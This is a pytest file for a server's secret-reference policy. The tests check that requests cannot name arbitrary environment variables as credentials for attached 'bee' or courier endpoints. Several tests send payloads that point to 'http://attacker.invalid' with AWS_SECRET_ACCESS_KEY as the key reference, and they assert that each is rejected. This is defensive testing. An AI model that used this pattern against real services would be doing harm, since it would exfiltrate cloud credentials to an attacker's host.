"""A reference that arrives in a request must not reach every environment variable.

Config is written by whoever runs the server. A request is written by whoever can reach
it, and `resolve_ref` reads any variable by name. Without a policy between the two, a
caller attaches a bee at a url they control, names AWS_SECRET_ACCESS_KEY as its
credential reference, and the value leaves as a bearer header on the first request
routed there. The endpoint never has to answer; it only has to be attached.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from agent import secrets as S


@pytest.fixture
def server(tmp_path, monkeypatch):
    """An instance admin and a plain user."""
    monkeypatch.setenv("REXGRAPH_CONFIG_DIR", str(tmp_path))
    monkeypatch.setenv("REXGRAPH_AUDIT_JOURNAL", str(tmp_path / "audit.jsonl"))
    monkeypatch.setenv("REXGRAPH_RCDB_URI", f"file://{tmp_path}/rcdb")
    monkeypatch.delenv(S.REQUEST_REFS_ENV, raising=False)
    from agent.rcdb import reset_default_store
    from agent.server import audit, auth
    auth.reset_auth_manager(); audit.reset_cache(); reset_default_store()
    from agent.server.app import app
    mgr = auth.get_auth_manager()
    mgr.enable_auth()
    admin = mgr.bootstrap_admin()
    bob = mgr.create_token("bob", ["default"], role="user")
    yield (TestClient(app), {"Authorization": f"Bearer {admin}"},
           {"Authorization": f"Bearer {bob}"})
    auth.reset_auth_manager(); audit.reset_cache(); reset_default_store()


def test_a_request_reference_is_denied_by_default(monkeypatch):
    monkeypatch.delenv(S.REQUEST_REFS_ENV, raising=False)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "would-have-leaked")
    assert S.request_refs_allowed() == set()
    with pytest.raises(PermissionError, match="not an allowed request reference"):
        S.resolve_request_ref("AWS_SECRET_ACCESS_KEY")


def test_an_operator_names_the_exceptions(monkeypatch):
    monkeypatch.setenv(S.REQUEST_REFS_ENV, "MY_BEE_KEY, OTHER_KEY")
    monkeypatch.setenv("MY_BEE_KEY", "fine")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "still-not")
    assert S.resolve_request_ref("MY_BEE_KEY") == "fine"
    with pytest.raises(PermissionError):
        S.resolve_request_ref("AWS_SECRET_ACCESS_KEY")


def test_an_empty_reference_is_not_a_refusal():
    """No credential is an ordinary case; only a NAMED one needs permission."""
    assert S.resolve_request_ref("") == ""


def test_config_keeps_its_reach(monkeypatch):
    """resolve_ref is what operator config uses and is deliberately unrestricted."""
    monkeypatch.delenv(S.REQUEST_REFS_ENV, raising=False)
    monkeypatch.setenv("OPERATOR_ONLY", "value")
    assert S.resolve_ref("OPERATOR_ONLY") == "value"


def test_attaching_a_bee_is_admin(server):
    client, ah, bh = server
    body = {"name": "b", "url": "http://127.0.0.1:9"}
    assert client.post("/api/v1/hive/attach", headers=bh, json=body).status_code == 403
    assert client.post("/api/v1/hive/attach", headers=ah, json=body).status_code == 200


def test_admin_still_cannot_name_any_variable(server, monkeypatch):
    """The gate is not the whole fix. An instance admin of one deployment should not be
    able to walk the process environment by naming it a bee credential."""
    client, ah, bh = server
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "would-have-leaked")
    r = client.post("/api/v1/hive/attach", headers=ah, json={
        "name": "leak", "url": "http://attacker.invalid", "api_key_ref": "AWS_SECRET_ACCESS_KEY"})
    assert r.status_code == 400 and "not an allowed request reference" in r.json()["detail"]


def test_an_allowed_reference_attaches(server, monkeypatch):
    client, ah, bh = server
    monkeypatch.setenv(S.REQUEST_REFS_ENV, "MY_BEE_KEY")
    monkeypatch.setenv("MY_BEE_KEY", "sekrit")
    r = client.post("/api/v1/hive/attach", headers=ah, json={
        "name": "ok", "url": "http://127.0.0.1:9", "api_key_ref": "MY_BEE_KEY"})
    assert r.status_code == 200
    assert r.json()["bee"]["has_api_key"] is True
    assert "sekrit" not in r.text, "the key must never come back out"


def test_spawning_a_process_is_admin(server):
    """spawn starts a subprocess with a caller-chosen path; same class of action."""
    client, ah, bh = server
    body = {"name": "x", "model_path": "/nonexistent.gguf"}
    assert client.post("/api/v1/hive/spawn", headers=bh, json=body).status_code == 403


def test_a_courier_peer_reference_is_checked_too(server, monkeypatch):
    client, ah, bh = server
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "would-have-leaked")
    r = client.post("/api/v1/courier/peers", headers=ah, json={
        "name": "p", "url": "http://attacker.invalid", "api_key_ref": "AWS_SECRET_ACCESS_KEY"})
    assert r.status_code == 400 and "not an allowed request reference" in r.json()["detail"]
